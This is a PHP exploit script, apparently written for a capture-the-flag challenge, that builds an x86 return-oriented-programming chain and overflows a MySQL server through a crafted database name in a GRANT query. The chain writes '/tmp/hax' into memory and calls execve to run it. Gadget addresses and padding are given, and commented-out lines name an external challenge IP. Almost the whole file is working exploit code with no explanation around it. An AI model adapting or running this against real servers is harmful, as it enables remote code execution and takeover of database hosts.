<?php
// const host = '37.187.22.21:3342';
// const host = '37.187.22.21:54321';
const host = '127.0.0.1:54321';
const user = 'guest';
const pass = 'guest';


const length = 283; // gdb

/*
Gadgets : 
0x08052960: ret  ;  (1 found)
0x082a1579: pop eax ; ret  ;  (1 found)
0x08442908: xchg eax, ebp ; ret  ;  (1 found)
0x087f052d: xchg eax, ebx ; ret  ;  (1 found)
0x084e3456: xchg eax, ecx ; ret  ;  (1 found)
0x08240d14: xchg eax, edi ; ret  ;  (1 found)
0x084e3062: xchg eax, edx ; ret  ;  (1 found)
0x08190c2a: mov dword [eax], edx ; pop ebp ; ret  ;  (1 found)
0x0838733a: add eax, 0x01 ; ret  ;  (1 found)
0x0838484f: int 0x80 ;  (1 found)
*/

const ret     = 0x08240d14;

const popeax  = 0x082a1579;

const xchgebp = 0x08442908;
const xchgebx = 0x087f052d;
const xchgecx = 0x084e3456;
const xchgedi = 0x08240d14;
const xchgedx = 0x084e3062;

const writeeax = 0x08190c2a;
const addeax   = 0x0838733a;
const syscall  = 0x0838484f;

$pad = '';
$rop = [
	ret, // identity
	ret, // identity
	ret, // identity
	
	popeax,     // pop eax
	0x09103030, // For some reasons, it is read
	
	// Real rop starts here
	
	// write /tmp to 0x09103030
	popeax,   unpack('L', '/tmp')[1],
	xchgedx,
	popeax,   0x09103030, // write it to 0x09103030
	writeeax, 0x09103034, // pops ebp
	
	// Write /hax to 0x09103034
	popeax,   unpack('L', '/hax')[1],
	xchgedx,
	xchgebp,
	writeeax, 0x0910303C,
	
	// Write address of "/tmp/hax" to 0x0910303C
	popeax,   0x09103030,
	xchgedx,
	xchgebp,
	writeeax, 0x09103040,
	
	/*
	Our data area is :
	0x09103030: /tmp
	0x09103034: /hax
	0x09103038: \0\0\0\0
	0x0910303C: 0x09103030
	0x09103040: 0x00000000
	*/
	
	/*
	 x86 syscalls :
	 eax = syscall # (0x0B == execve)
	 ebx = param 1
	 ecx = param 2
	 edx = param 3
	*/
	
	popeax, 0x09103030,
	xchgebx,            // ebx = "/tmp/hax"
	
	popeax, 0x0910303C, 
	xchgecx,            // ecx = {"/tmp/hax", NULL}
	
	popeax, 0x09103040, // pointer to NULL
	xchgedx,            // envp = {NULL}
	
	xchgedi, // edi seems to be always 0. Who care if it's true ? It's a CTF !
	// 0 + 11 * 1
	addeax,
	addeax,
	addeax,
	addeax,
	addeax,
	addeax,
	addeax,
	addeax,
	addeax,
	addeax,
	addeax,
	
	syscall,
	/**/
	0x21526558 // EOF for debugging
];/**/

$pad  = str_repeat("B", length);
$pad .= "EBX!"; // EBX
$pad .= "\x30\x30\x10\x09"; // ESI = 0x09103030
// $pad .= "ESI!"; // ESI = 0x09103030
$pad .= "EDI!"; // EDI
$pad .= "\x30\x30\x10\x09"; // EBP
// $pad .= "EBP!"; // EBP
// $pad .= "YOLO"; // EIP

for($i = 0; $i < sizeof($rop); $i++)
	$pad .= pack('L', $rop[$i]);

// printf("%s\n", base64_encode($pad));

$PDO = new PDO('mysql:dbname=exploit06;charset=utf8;host=' . host, user, pass);
$PDO->setAttribute(PDO::ATTR_CASE,                     PDO::CASE_NATURAL);
$PDO->setAttribute(PDO::ATTR_ERRMODE,                  PDO::ERRMODE_EXCEPTION);
$PDO->setAttribute(PDO::ATTR_ORACLE_NULLS,             PDO::NULL_NATURAL);
$PDO->setAttribute(PDO::ATTR_STRINGIFY_FETCHES,        false);
$PDO->setAttribute(PDO::MYSQL_ATTR_USE_BUFFERED_QUERY, true);

$PDO->query("GRANT ALL ON `XeR" . $pad . "`.* to EISTI");
